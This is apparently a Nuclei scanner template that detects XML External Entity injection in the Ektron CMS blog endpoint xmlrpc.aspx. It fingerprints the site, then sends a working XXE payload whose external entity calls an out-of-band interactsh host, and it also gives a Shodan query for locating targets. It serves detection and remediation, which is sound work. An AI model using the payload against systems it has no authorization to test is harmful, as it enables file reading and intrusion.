id: ektron-blog-xmlrpc-xxe

info:
  name: Ektron CMS Blogs xmlrpc.aspx - XML External Entity Injection
  author: pussycat0x
  severity: high
  description: |
    该模板用于检测 Ektron CMS Blogs xmlrpc.aspx - XML External Entity Injection。该类漏洞通常源于 XML 解析器允许处理外部实体或 DTD，攻击者可借此触发文件读取或外带请求。模板会向 `/`、`/WorkArea/Blogs/xmlrpc.aspx` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能读取服务器本地文件、探测内网服务或通过外带通道泄露敏感数据。
    - 在部分解析器和业务场景下，XXE 还可能造成拒绝服务或作为进一步入侵链路的入口。
  remediation: |
    - 禁用 XML 解析器的外部实体、外部 DTD 和 XInclude 支持。
    - 升级存在缺陷的 XML 处理库，并对 XML 输入进行大小、结构和来源限制。
    - 限制应用服务器外联能力，排查异常 DNS、HTTP 或 LDAP 外带请求。
  reference:
    - https://www.exploit-db.com/exploits/21085
    - https://packetstormsecurity.com/files/116259/Ektron-CMS-8.5.0-File-Upload-XXE-Injection.html
    - https://www.acunetix.com/vulnerabilities/web/ektron-cms-multiple-vulnerabilities
  classification:
    cwe-id: CWE-611,CWE-918
  metadata:
    verified: false
    max-request: 2
    shodan-query: http.html:"EktronClientManager"
  tags: xxe,ektron,cms,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "EktronClientManager")'
        condition: and
        internal: true

  - raw:
      - |
        POST /WorkArea/Blogs/xmlrpc.aspx HTTP/1.1
        Host: {{Hostname}}

        <!DOCTYPE scan [<!ENTITY test SYSTEM "http://{{interactsh-url}}">]>
        <scan>&test;</scan>

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
          - status_code == 200 || status_code == 500
        condition: and
